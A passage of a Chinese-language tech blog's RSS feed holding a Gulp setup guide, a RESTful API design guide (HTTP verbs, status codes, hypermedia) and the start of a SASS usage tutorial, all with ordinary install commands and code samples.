<li>丑化(Uglify) (<a href="http://github.com/terinjokes/gulp-uglify" target="_blank" rel="noopener noreferrer">gulp-uglify</a>)</li>
<li>图片压缩 (<a href="http://github.com/sindresorhus/gulp-imagemin" target="_blank" rel="noopener noreferrer">gulp-imagemin</a>)</li>
<li>即时重整(LiveReload) (<a href="http://github.com/vohof/gulp-livereload" target="_blank" rel="noopener noreferrer">gulp-livereload</a>)</li>
<li>清理档案 (<a href="http://github.com/peter-vilja/gulp-clean" target="_blank" rel="noopener noreferrer">gulp-clean</a>)</li>
<li>图片快取, 只有更改过得图片会进行压缩 (<a href="http://github.com/jgable/gulp-cache/" target="_blank" rel="noopener noreferrer">gulp-cache</a>)</li>
<li>更动通知 (<a href="http://github.com/mikaelbr/gulp-notify" target="_blank" rel="noopener noreferrer">gulp-notify</a>)</li>
</ul>
<h3 id="通过-npm-进行安装" tabindex="-1"> 通过 npm 进行安装</h3>
<p><code>Install Format:</code></p>
<div><pre><code><span>npm</span> <span>install</span> <span>[</span>Module_Name<span>]</span> --save-dev
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="gulp-任务配置" tabindex="-1"> Gulp 任务配置</h2>
<h3 id="创建-gulpfile-js-文件" tabindex="-1"> 创建 gulpfile.js 文件</h3>
<p>在项目根目录中, 创建 <code>gulpfile.js</code> 文件, 用来配置和定义任务（ <code>task</code> ）。</p>
<div><pre><code><span>touch</span> gulpfile.js
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="我的安装插件" tabindex="-1"> 我的安装插件</h3>
<div><pre><code><span>npm</span> <span>install</span> gulp --save-dev               <span># 基础库</span>
<span>npm</span> <span>install</span> gulp-livereload --save-dev    <span># 网页自动刷新</span>
<span>npm</span> <span>install</span> gulp-webserver --save-dev     <span># 本地服务器</span>
<span>npm</span> <span>install</span> gulp-notify --save-dev        <span># 更新</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="我的-gulpfile-js-配置" tabindex="-1"> 我的 gulpfile.js 配置</h3>
<p>打开 <code>gulpfile.js</code> 文件, 填写相关配置。</p>
<div><pre><code><span>// 引入 gulp</span>
<span>var</span> gulp <span>=</span> <span>require</span><span>(</span><span>"gulp"</span><span>)</span><span>;</span> <span>// 基础库</span>

<span>// 引入 gulp 插件</span>
<span>var</span> livereload <span>=</span> <span>require</span><span>(</span><span>"gulp-livereload"</span><span>)</span><span>;</span> <span>// 网页自动刷新（服务器控制客户端同步刷新）</span>
<span>var</span> webserver <span>=</span> <span>require</span><span>(</span><span>"gulp-webserver"</span><span>)</span><span>;</span> <span>// 本地服务器</span>

<span>// 注册任务</span>
gulp<span>.</span><span>task</span><span>(</span><span>"webserver"</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  gulp
    <span>.</span><span>src</span><span>(</span><span>"./"</span><span>)</span> <span>// 服务器目录（./ 代表根目录）</span>
    <span>.</span><span>pipe</span><span>(</span>
      <span>webserver</span><span>(</span><span>{</span>
        <span>// 运行 gulp-webserver</span>
        <span>livereload</span><span>:</span> <span>true</span><span>,</span> <span>// 启用 LiveReload</span>
        <span>open</span><span>:</span> <span>true</span><span>,</span> <span>// 服务器启动时自动打开网页</span>
      <span>}</span><span>)</span>
    <span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>// 监听任务</span>
gulp<span>.</span><span>task</span><span>(</span><span>"watch"</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  gulp<span>.</span><span>watch</span><span>(</span><span>"*.html"</span><span>,</span> <span>[</span><span>"html"</span><span>]</span><span>)</span><span>;</span> <span>// 监听根目录下所有 .html 文件</span>
<span>}</span><span>)</span><span>;</span>

<span>// 默认任务</span>
gulp<span>.</span><span>task</span><span>(</span><span>"default"</span><span>,</span> <span>[</span><span>"webserver"</span><span>,</span> <span>"watch"</span><span>]</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>RESTful API 设计指南（补充）</title>
      <link>https://vxhly.github.io/views/manual/restfui-api.html</link>
      <guid>https://vxhly.github.io/views/manual/restfui-api.html</guid>
      <source url="https://vxhly.github.io/rss.xml">RESTful API 设计指南（补充）</source>
      <description>前言
网络应用程序, 分为前端和后端两个部分。这时候必须有一种统一的机制, 方便不同的前端设备与后端进行通信。这导致 API 构架的流行, 甚至出现 &amp;quot;API First&amp;quot; 的设计思想。 RESTful API  是目前比较成熟的一套互联网应用程序的 API 设计理论。

</description>
      <category>manual</category>
      <pubDate>Fri, 29 Sep 2017 12:17:33 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>网络应用程序, 分为前端和后端两个部分。这时候必须有一种统一的机制, 方便不同的前端设备与后端进行通信。这导致 API 构架的流行, 甚至出现 &quot;API First&quot; 的设计思想。<a href="http://en.wikipedia.org/wiki/Representational_state_transfer" target="_blank" rel="noopener noreferrer"> <code>RESTful API</code> </a> 是目前比较成熟的一套互联网应用程序的 API 设计理论。</p>
</div>

<h2 id="先言" tabindex="-1"> 先言</h2>
<div><p>提示</p>
<p>该篇博文为补充 <a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener noreferrer">RESTful API 设计指南- 阮一峰的网络日志</a></p>
<p><a href="https://github.com/aisuhua/restful-api-design-references" target="_blank" rel="noopener noreferrer">RESTful API 设计参考文献列表, 可帮助你更加彻底的了解 REST 风格的接口设计</a>。</p>
<p>REST API 一般用来将某种资源和允许的对资源的操作暴露给外界, 使调用者能够以正确的方式操作资源。这里, 在输入输出的处理上, 要符合 HTTP/1.1（不久的将来, 要符合 HTTP/2.0）的 RFC, 保证接口的一致性。</p>
</div>
<h2 id="协议" tabindex="-1"> 协议</h2>
<p>API 与用户的通信协议, 总是使用 <a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html" target="_blank" rel="noopener noreferrer">https</a> 协议。</p>
<h2 id="域名" tabindex="-1"> 域名</h2>
<p>应该尽量将 API 部署在专用域名之下。</p>
<p><a href="https://api.example.com" target="_blank" rel="noopener noreferrer">https://api.example.com</a></p>
<p>如果确定 API 很简单, 不会有进一步扩展, 可以考虑放在主域名下。</p>
<p><a href="https://example.org/api/" target="_blank" rel="noopener noreferrer">https://example.org/api/</a></p>
<h2 id="版本-versioning" tabindex="-1"> 版本（Versioning）</h2>
<p>应该将 API 的版本号放入 URL。</p>
<p><a href="https://api.example.com/v1/" target="_blank" rel="noopener noreferrer">https://api.example.com/v1/</a></p>
<p>另一种做法是, 将版本号放在 HTTP 头信息中, 但不如放入 URL 方便和直观。<a href="http://developer.github.com/v3/media/#request-specific-version" target="_blank" rel="noopener noreferrer">Github</a> 采用这种做法。</p>
<h2 id="路径-endpoint" tabindex="-1"> 路径（Endpoint）</h2>
<p>路径又称&quot;终点&quot;（endpoint）, 表示 API 的具体网址。 在 RESTful 架构中, 每个网址代表一种资源（resource）, 所以网址中不能有动词, 只能有名词, 而且所用的名词往往与数据库的表格名对应。一般来说, 数据库中的表都是同种记录的&quot;集合&quot;（collection）, 所以 API 中的名词也应该使用复数。 举例来说, 有一个 API 提供动物园（zoo）的信息, 还包括各种动物和雇员的信息, 则它的路径应该设计成下面这样。</p>
<ul>
<li><a href="https://api.example.com/v1/zoos" target="_blank" rel="noopener noreferrer">https://api.example.com/v1/zoos</a></li>
<li><a href="https://api.example.com/v1/animals" target="_blank" rel="noopener noreferrer">https://api.example.com/v1/animals</a></li>
<li><a href="https://api.example.com/v1/employees" target="_blank" rel="noopener noreferrer">https://api.example.com/v1/employees</a>、</li>
</ul>
<h2 id="restful-api-规范" tabindex="-1"> RESTful API 规范</h2>
<ul>
<li>URI 请求采用小写字母, 数字, 部分特殊符号（非制表符, 该特殊符号特指 _、&amp;、?）组成。</li>
<li>URI 请求中不采用大小写混合的驼峰命名方式, 尽量采用全小写单词, 如果需要连接多个单词, 则采用连接符 <code>_</code> 连接单词</li>
<li>URI 中不包含文件名, 例如 <code>/api/test.php</code></li>
<li>URI 中不包含 HTTP 动词, 动作由请求包体中的 method 决定, 语义化能够一眼看出当前的操作</li>
<li>URI 不能过长, 任何 HTTP 协议客户端和服务器都应当支持 8000 字节的首行（方法名 + URI + HTTP 版本号）, 可以理解成支持 7980+ 字节的 URI</li>
<li>非 ID 形式的全部通过使用 ? 传参形式, 并且使用 encodeURI 或者 encodeURIComponent 进行编码</li>
<li>使用复数形式的单词表示大量的数据, 例如 <code>/api/users</code></li>
<li>根据需求添加 版本号, 例如 <code>/api/v1/users</code></li>
<li>根据需求添加 SecretKey, 特指某些对外服务盈利的接口</li>
<li>过深的导航容易导致 url 膨胀, 不易维护, 如 GET /zoos/1/areas/3/animals/4, 尽量使用查询参数代替路径中的实体导航, 如 GET /animals?zoo=1&amp;area=3</li>
<li>对于一些需要用户验证的查用 <code>OAuth</code> 或者 <code>JWT</code> , 并且添加 HTTP Authorization 请求头</li>
<li>关于 <code>Content-Type</code> 采用 <code>application/json;charset=UTF-8</code> 或者 <code> application/x-www-form-urlencoded;charset=UTF-8</code></li>
</ul>
<h2 id="http-动词" tabindex="-1"> HTTP 动词</h2>
<p>对于资源的具体操作类型, 由 HTTP 动词表示。 常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。</p>
<ul>
<li><strong>GET（SELECT）</strong> =&gt; 从服务器取出资源（一项或多项）。</li>
<li><strong>POST（CREATE）</strong> =&gt; 在服务器新建一个资源。</li>
<li><strong>PUT（UPDATE）</strong> =&gt; 在服务器更新资源（客户端提供改变后的完整资源）。</li>
<li><strong>PATCH（UPDATE）</strong> =&gt; 在服务器更新资源（客户端提供改变的属性）。</li>
<li><strong>DELETE（DELETE）</strong> =&gt; 从服务器删除资源。</li>
</ul>
<p>还有两个不常用的 HTTP 动词。</p>
<ul>
<li><strong>HEAD</strong> =&gt; 获取资源的元数据。</li>
<li><strong>OPTIONS</strong> =&gt; 获取信息, 关于资源的哪些属性是客户端可以改变的。</li>
</ul>
<p>下面是一些例子。</p>
<ul>
<li><strong>GET</strong> <code>/zoos</code> =&gt; 列出所有动物园</li>
<li><strong>POST</strong> <code>/zoos</code> =&gt; 新建一个动物园</li>
<li><strong>GET</strong> <code>/zoos/ID</code> =&gt; 获取某个指定动物园的信息</li>
<li><strong>PUT</strong> <code>/zoos/ID</code> =&gt; 更新某个指定动物园的信息（提供该动物园的全部信息）</li>
<li><strong>PATCH</strong> <code>/zoos/ID</code> =&gt; 更新某个指定动物园的信息（提供该动物园的部分信息）</li>
<li><strong>DELETE</strong> <code>/zoos/ID</code> =&gt; 删除某个动物园</li>
<li><strong>GET</strong> <code>/zoos/ID/animals</code> =&gt; 列出某个指定动物园的所有动物</li>
<li><strong>DELETE</strong> <code>/zoos/ID/animals/ID</code> =&gt; 删除某个指定动物园的指定动物</li>
</ul>
<h2 id="过滤信息-filtering" tabindex="-1"> 过滤信息（Filtering）</h2>
<p>如果记录数量很多, 服务器不可能都将它们返回给用户。AP I 应该提供参数, 过滤返回结果。 下面是一些常见的参数。</p>
<ul>
<li><code>?limit=10</code> =&gt; 指定返回记录的数量</li>
<li><code>?offset=10</code> =&gt; 指定返回记录的开始位置。</li>
<li><code>?page=2&amp;per_page=100</code> =&gt; 指定第几页, 以及每页的记录数。</li>
<li><code>?sortby=nameℴ=asc</code> =&gt; 指定返回结果按照哪个属性排序, 以及排序顺序。</li>
<li><code>?animal_type_id=1</code> =&gt; 指定筛选条件</li>
</ul>
<p>参数的设计允许存在冗余, 即允许 API 路径和 URL 参数偶尔有重复。比如, GET <code>/zoo/ID/animals</code> 与 GET <code>/animals?zoo_id=ID</code> 的含义是相同的。</p>
<h2 id="状态码-status-codes" tabindex="-1"> 状态码（Status Codes）</h2>
<p>服务器向用户返回的状态码和提示信息, 常见的有以下一些（方括号中是该状态码对应的 HTTP 动词）。</p>
<h3 id="请求成功" tabindex="-1"> 请求成功</h3>
<ul>
<li><strong>200</strong> <code>OK</code> -&gt; 【 <code>GET</code> 】 =&gt; 服务器成功返回用户请求的数据, 该操作是幂等的（Idempotent）。</li>
<li><strong>201</strong> <code>CREATED</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】 =&gt; 对象创建成功并返回相应资源数据, 如 <code>POST</code> 成功；创建完成后响应头中应该携带头标 <code>Location</code> , 指向新建资源的地址</li>
<li><strong>202</strong> <code>Accepted</code> -&gt; 【 <code>*</code> 】 =&gt; 接受请求, 但无法立即完成创建行为, 比如其中涉及到一个需要花费若干小时才能完成的任务。返回的实体中应该包含当前状态的信息, 以及指向处理状态监视器或状态预测的指针, 以便客户端能够获取最新状态。</li>
<li><strong>204</strong> <code>No Content </code> -&gt; 【 <code>DELETE/PATCH</code> 】 =&gt; 请求执行成功, 不返回相应资源数据</li>
</ul>
<h3 id="重定向" tabindex="-1"> 重定向</h3>
<p>重定向的新地址都需要在响应头 Location 中返回</p>
<ul>
<li><strong>301</strong> <code>Moved Permanently </code> -&gt; 【 <code>*</code> 】 =&gt; 被请求的资源已永久移动到新位置</li>
<li><strong>302</strong> <code>Found</code> -&gt; 【 <code>*</code> 】 =&gt; 请求的资源现在临时从不同的 URI 响应请求</li>
<li><strong>303</strong> <code>See Other</code> -&gt; 【 <code>*</code> 】 =&gt; 应当前请求的响应可以在另一个 URI 上被找到, 客户端应该使用 GET 方法进行请求。比如在创建已经被创建的资源时, 可以返回 303</li>
<li><strong>307</strong> <code>Temporary Redirect </code> -&gt; 【 <code>*</code> 】 =&gt; 对应当前请求的响应可以在另一个 URI 上被找到, 客户端应该保持原有的请求方法进行请求</li>
</ul>
<h3 id="条件请求" tabindex="-1"> 条件请求</h3>
<ul>
<li><strong>304</strong> <code>Not Modified</code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 未改变说明无需再次传输请求的内容, 也就是说可以使用缓存的内容。这通常是在一些安全的方法（safe）, 资源自从上次请求后没有再次发生变化, 主要使用场景在于实现数据缓存</li>
<li><strong>409</strong> <code>Conflict </code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 请求操作和资源的当前状态存在冲突。主要使用场景在于实现并发控制</li>
<li><strong>412</strong> <code>Precondition Failed</code> -&gt; 【 <code>GET/HEAD</code> 】 =&gt; 服务器在验证在请求的头字段中给出先决条件时, 没能满足其中的一个或多个。主要使用场景在于实现并发控制</li>
</ul>
<h3 id="客户端错误" tabindex="-1"> 客户端错误</h3>
<ul>
<li><strong>400</strong> <code>Bad Request</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】 =&gt; 请求体包含语法错误, 用户发出的请求有错误, 服务器没有进行新建或修改数据的操作, 该操作是幂等的。</li>
<li><strong>401</strong> <code>Unauthorized</code> -&gt; 【 <code>*</code> 】 =&gt; 表示用户没有权限（令牌、用户名、密码错误）。需要验证用户身份, 如果服务器就算是身份验证后也不允许客户访问资源, 应该响应 403 Forbidden 。如果请求里有 Authorization 头, 那么必须返回一个 WWW-Authenticate 头</li>
<li><strong>403</strong> <code>Forbidden</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器拒绝执行, 表示用户得到授权（与 401 错误相对）, 但是访问是被禁止的。</li>
<li><strong>404</strong> <code>Not Found</code> -&gt; 【 <code>*</code> 】 =&gt; 用户发出的请求针对的是不存在的记录, 服务器没有进行操作, 该操作是幂等的。</li>
<li><strong>406</strong> <code>Not Acceptable</code> -&gt; 【 <code>GET</code> 】 =&gt; 用户请求的格式不可得（比如用户请求 JSON 格式, 但是只有 XML 格式）。服务器不支持客户端请求的内容格式, 但响应里会包含服务端能够给出的格式的数据, 并在 Content-Type 中声明格式名称</li>
<li><strong>410</strong> <code>Gone</code> -&gt; 【 <code>GET</code> 】 =&gt; 用户请求的资源被永久删除, 且不会再得到的。被请求的资源已被删除, 只有在确定了这种情况是永久性的时候才可以使用, 否则建议使用 404 Not Found</li>
<li><strong>413</strong> <code>Payload Too Large</code> -&gt; 【 <code>POST/PUT</code> 】=&gt; POST 或者 PUT 请求的消息实体过大</li>
<li><strong>415</strong> <code>Unsupported Media Type</code> -&gt; 【 <code>GET</code> 】=&gt; 服务器不支持请求中提交的数据的格式</li>
<li><strong>422</strong> <code>Unprocessable Entity</code> -&gt; 【 <code>POST/PUT/PATCH</code> 】=&gt; 请求格式正确, 但是由于含有语义错误, 无法响应</li>
<li><strong>428</strong> <code>Precondition Required</code> -&gt; 【 <code>GET</code> 】 =&gt; 要求先决条件, 如果想要请求能成功必须满足一些预设的条件</li>
</ul>
<h3 id="服务端错误" tabindex="-1"> 服务端错误</h3>
<ul>
<li><strong>500</strong> <code>INTERNAL SERVER ERROR</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器遇到了一个未曾预料的状况, 导致了它无法完成对请求的处理。</li>
<li><strong>501</strong> <code>Not Implemented</code> -&gt; 【 <code>*</code> 】 =&gt; 服务器不支持当前请求所需要的某个功能。</li>
<li><strong>502</strong> <code>Bad Gateway</code> -&gt; 【 <code>*</code> 】 =&gt; 作为网关或者代理工作的服务器尝试执行请求时, 从上游服务器接收到无效的响应。</li>
<li><strong>503</strong> <code>Service Unavailable</code> -&gt; 【 <code>*</code> 】 =&gt; 由于临时的服务器维护或者过载, 服务器当前无法处理请求。这个状况是临时的, 并且将在一段时间以后恢复。</li>
</ul>
<p>状态码的完全列表参见<a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="noopener noreferrer">这里</a>。</p>
<h2 id="错误处理-error-handling" tabindex="-1"> 错误处理（Error handling）</h2>
<ol>
<li>不要发生了错误但给 2xx 响应, 客户端可能会缓存成功的 http 请求；</li>
<li>正确设置 http 状态码, 不要自定义；</li>
<li>Response body 提供 1) 错误的代码（日志/问题追查）；2) 错误的描述文本（展示给用户）。</li>
<li>如果状态码是 4xx, 就应该向用户返回出错信息。一般来说, 返回的信息中将 error 作为键名, 出错信息作为键值即可。</li>
</ol>
<p>业务类异常必须提供 2 种信息:</p>
<ul>
<li>如果抛出该类异常, HTTP 响应状态码应该设成什么；</li>
<li>异常的文本描述；</li>
</ul>
<p>在 Controller 层使用统一的异常拦截器:</p>
<ul>
<li>设置 HTTP 响应状态码: 对业务类异常, 用它指定的 HTTP code；对非业务类异常, 统一 500；</li>
<li>Response Body 的错误码: 异常类名</li>
<li>Response Body 的错误描述: 对业务类异常, 用它指定的错误文本；对非业务类异常, 线上可以统一文案如“服务器端错误, 请稍后再试”, 开发或测试环境中用异常的 stacktrace, 服务器端提供该行为的开关。</li>
</ul>
<h2 id="返回结果" tabindex="-1"> 返回结果</h2>
<p>针对不同操作, 服务器向用户返回的结果应该符合以下规范。</p>
<ul>
<li><strong>Get</strong> <code>/collection</code> =&gt; 返回资源对象的列表（数组）</li>
<li><strong>Get</strong> <code>/collection/resource</code> =&gt; 返回单个资源对象</li>
<li><strong>POST</strong> <code>/collection</code> =&gt; 返回新生成的资源对象</li>
<li><strong>PUT</strong> <code>/collection/resource</code> =&gt; 返回完整的资源对象</li>
<li><strong>PATCH</strong> <code>/collection/resource</code> =&gt; 返回完整的资源对象</li>
<li><strong>DELETE</strong> <code>/collection/resource</code> =&gt; 返回一个空文档</li>
</ul>
<h2 id="hypermedia-api" tabindex="-1"> Hypermedia API</h2>
<p>RESTful API 最好做到 Hypermedia, 即返回结果中提供链接, 连向其他 API 方法, 使得用户不查文档, 也知道下一步应该做什么。 比如, 当用户向 <a href="http://api.github.com/" target="_blank" rel="noopener noreferrer">api.github.com</a> 的根目录发出请求, 会得到这样一个文档。</p>
<div><pre><code><span>{</span>
  <span>"link"</span><span>:</span> <span>{</span>
    <span>"rel"</span><span>:</span> <span>"collection https://www.example.com/zoos"</span><span>,</span>
    <span>"href"</span><span>:</span> <span>"https://api.example.com/zoos"</span><span>,</span>
    <span>"title"</span><span>:</span> <span>"List of zoos"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"application/vnd.yourformat+json"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>上面代码表示, 文档中有一个 link 属性, 用户读取这个属性就知道下一步该调用什么 API 了。rel 表示这个 API 与当前网址的关系（collection 关系, 并给出该 collection 的网址）, href 表示 API 的路径, title 表示 API 的标题, type 表示返回类型。</p>
<p>Hypermedia API 的设计被称为 <a href="http://en.wikipedia.org/wiki/HATEOAS" target="_blank" rel="noopener noreferrer">HATEOAS</a>。Github 的 API 就是这种设计, 访问 <a href="http://api.github.com/" target="_blank" rel="noopener noreferrer">api.github.com</a> 会得到一个所有可用 API 的网址列表。</p>
<div><pre><code><span>{</span>
  <span>"current_user_url"</span><span>:</span> <span>"https://api.github.com/user"</span><span>,</span>
  <span>"authorizations_url"</span><span>:</span> <span>"https://api.github.com/authorizations"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>从上面可以看到, 如果想获取当前用户的信息, 应该去访问 <a href="http://api.github.com/user" target="_blank" rel="noopener noreferrer">api.github.com/user</a>, 然后就得到了下面结果。</p>
<div><pre><code><span>{</span>
  <span>"message"</span><span>:</span> <span>"Requires authentication"</span><span>,</span>
  <span>"documentation_url"</span><span>:</span> <span>"https://developer.github.com/v3"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>上面代码表示, 服务器给出了提示信息, 以及文档的网址。</p>
<h2 id="其他" tabindex="-1"> 其他</h2>
<ul>
<li>（1）API 的身份认证应该使用 <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener noreferrer">OAuth 2.0</a> 框架。</li>
<li>（2）服务器返回的数据格式, 应该尽量使用 JSON, 避免使用 XML。</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>SASS 用法指南</title>
      <link>https://vxhly.github.io/views/manual/sass-usage-guide.html</link>
      <guid>https://vxhly.github.io/views/manual/sass-usage-guide.html</guid>
      <source url="https://vxhly.github.io/rss.xml">SASS 用法指南</source>
      <description>前言
SASS 是 CSS 预处理器之一, 它的基本思想是, 用一种专门的编程语言, 进行网页样式设计, 然后再编译成正常的 CSS 文件, 它提供了许多便利的写法, 大大节省了设计者的时间, 使得 CSS 的开发, 变得简单和可维护。

</description>
      <category>manual</category>
      <pubDate>Tue, 11 Oct 2016 18:57:49 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>SASS 是 CSS 预处理器之一, 它的基本思想是, 用一种专门的编程语言, 进行网页样式设计, 然后再编译成正常的 CSS 文件, 它提供了许多便利的写法, 大大节省了设计者的时间, 使得 CSS 的开发, 变得简单和可维护。</p>
</div>

<h2 id="环境布置" tabindex="-1"> 环境布置</h2>
<h3 id="安装-ruby" tabindex="-1"> 安装 Ruby</h3>
<p>SASS 是 Ruby 语言写的, 但是两者的语法没有关系。不懂 Ruby, 照样使用。只是必须先<a href="http://www.ruby-lang.org/zh_cn/downloads/" target="_blank" rel="noopener noreferrer">安装 Ruby</a>, 然后再安装 SASS.</p>
<p>在 Ubuntu 下安装 Ruby, <code>For Example:</code></p>
<div><pre><code><span>sudo</span> <span>apt-get</span> <span>install</span> ruby
</code></pre><div aria-hidden="true"><div></div></div></div><p>查看版本号, 确认 Ruby 环境安装完成</p>
<div><pre><code>ruby -v
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装-sass" tabindex="-1"> 安装 SASS</h3>
<p>Ruby 安装好了, 之后执行命令</p>
<div><pre><code>gem <span>install</span> sass
</code></pre><div aria-hidden="true"><div></div></div></div><p>查看版本号, 确认 SASS 环境安装完成</p>
<div><pre><code>sass -v
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="使用" tabindex="-1"> 使用</h2>
<h3 id="编译" tabindex="-1"> 编译</h3>
<p>SASS 文件就是普通的文本文件, 里面可以直接使用 CSS 语法。文件后缀名是 <code>.scss</code> , 意思为 <code>Sassy CSS</code> 。</p>
<p>下面的命令, 可以在屏幕上显示 <code>.scss</code> 文件转化的 <code>.css</code> 代码。（假设文件名为 <code>test</code> 。）</p>
<div><pre><code>sass test.scss
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="编译风格" tabindex="-1"> 编译风格</h3>
<p>如果要将显示结果保存成文件, 后面再跟一个 <code>.css</code> 文件名, <code>For Example:</code></p>
<div><pre><code>sass test.scss test.css
</code></pre><div aria-hidden="true"><div></div></div></div><p>SASS 提供四个[编译风格](http://sass-lang.com/docs/yardoc/file. SASS_REFERENCE.html#output_style)的选项</p>
<ul>
<li><strong>nested</strong> =&gt; 嵌套缩进的 css 代码, 它是默认值。</li>
<li><strong>expanded</strong> =&gt; 没有缩进的、扩展的 css 代码。</li>
<li><strong>compact</strong> =&gt; 简洁格式的 css 代码。</li>
<li><strong>compressed</strong> =&gt; 压缩后的 css 代码。</li>
</ul>
<p>生产环境当中, 一般使用最后一个选项, <code>For Example:</code></p>
<div><pre><code>sass --style compressed test.sass test.css
</code></pre><div aria-hidden="true"><div></div></div></div><p>你也可以让 SASS 监听某个文件或目录, 一旦源文件有变动, 就自动生成编译后的版本</p>
<div><pre><code>sass --watch input.scss:output.css            <span># watch a file</span>
sass --watch app/sass:public/stylesheets      <span># watch a directory</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="基本用法" tabindex="-1"> 基本用法</h2>
<h3 id="变量" tabindex="-1"> 变量</h3>
<p>SASS 允许使用变量, 所有变量以 开头。 <code>For Example:</code></p>
<div><pre><code><span><span>$blue</span></span><span>:</span> #1875e7<span>;</span>

<span>div </span><span>{</span>
  <span>color</span><span>:</span> <span>$blue</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>如果变量需要镶嵌在字符串之中, 就必须需要写在 <code>#{}</code> 之中。 <code>For Example:</code></p>
<div><pre><code><span><span>$side</span></span><span>:</span> left<span>;</span>

<span>.rounded </span><span>{</span>
  <span>border-<span>#{$side}</span>-radius</span><span>:</span> 5px<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="计算功能" tabindex="-1"> 计算功能</h3>
<p>SASS 允许在代码中使用算式。 <code>For Example:</code></p>
<div><pre><code><span>body </span><span>{</span>
  <span>margin</span><span>:</span> <span>(</span>14px/2<span>)</span><span>;</span>
  <span>top</span><span>:</span> 50px <span>+</span> 100px<span>;</span>
  <span>right</span><span>:</span> <span>$var</span> <span>*</span> 10%<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="嵌套" tabindex="-1"> 嵌套</h3>
<p>SASS 允许选择器嵌套。比如, 下面的 CSS 代码:</p>
<div><pre><code><span>div h1 </span><span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>可以写成:</p>
<div><pre><code><span>div </span><span>{</span>
  <span>h1 </span><span>{</span>
    <span>color</span><span>:</span> red<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>属性也可以嵌套, 比如 <code>border-color</code> 属性, 可以写成:</p>
<div><pre><code><span>p </span><span>{</span>
  <span>border: </span><span>{</span>
    <span>color</span><span>:</span> red<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>
<p><code>border</code> 后面必须加上冒号。</p>
</div>
<p>在嵌套的代码块内, 可以使用 <code>&amp;</code> 引用父元素。比如 <code>a:hover</code> 伪类, 可以写成:</p>
<div><pre><code><span>a </span><span>{</span>
  <span><span>&amp;</span>:hover </span><span>{</span>
    <span>color</span><span>:</span> #ffb3ff<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="注释" tabindex="-1"> 注释</h3>
<p>SASS 共有两种注释风格。</p>
<p>标准的 CSS 注释 <code>/* comment */</code> , 会保留到编译后的文件。 单行注释 <code>// comment</code> , 只保留在 SASS 源文件中, 编译后被省略。</p>
<p>在 <code>/*</code> 后面加一个感叹号, 表示这是&quot;重要注释&quot;。即使是压缩模式编译, 也会保留这行注释, 通常可以用于声明版权信息。</p>
<div><pre><code><span>/*!
 * 重要注释！
 */</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="代码的重用" tabindex="-1"> 代码的重用</h2>
<h3 id="继承" tabindex="-1"> 继承</h3>
<p>SASS 允许一个选择器, 继承另一个选择器。比如, 现有 <code>class1</code> :</p>
<div><pre><code><span>.class1 </span><span>{</span>
  <span>border</span><span>:</span> 1px solid #ddd<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><code>class2</code> 要继承 <code>class1</code> , 就要使用 <code>@extend</code> 命令:</p>
<div><pre><code><span>.class2 </span><span>{</span>
  <span>@extend</span> .class1<span>;</span>
  <span>font-size</span><span>:</span> 120%<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="mixin" tabindex="-1"> Mixin</h3>
<p>Mixin 有点像 C 语言的宏（ <code>macro</code> ）, 是可以重用的代码块。 使用 <code>@mixin</code> 命令, 定义一个代码块。</p>
<div><pre><code><span>@mixin</span> <span>left </span><span>{</span>
  <span>float</span><span>:</span> left<span>;</span>
  <span>margin-left</span><span>:</span> 10px<span>;</span>
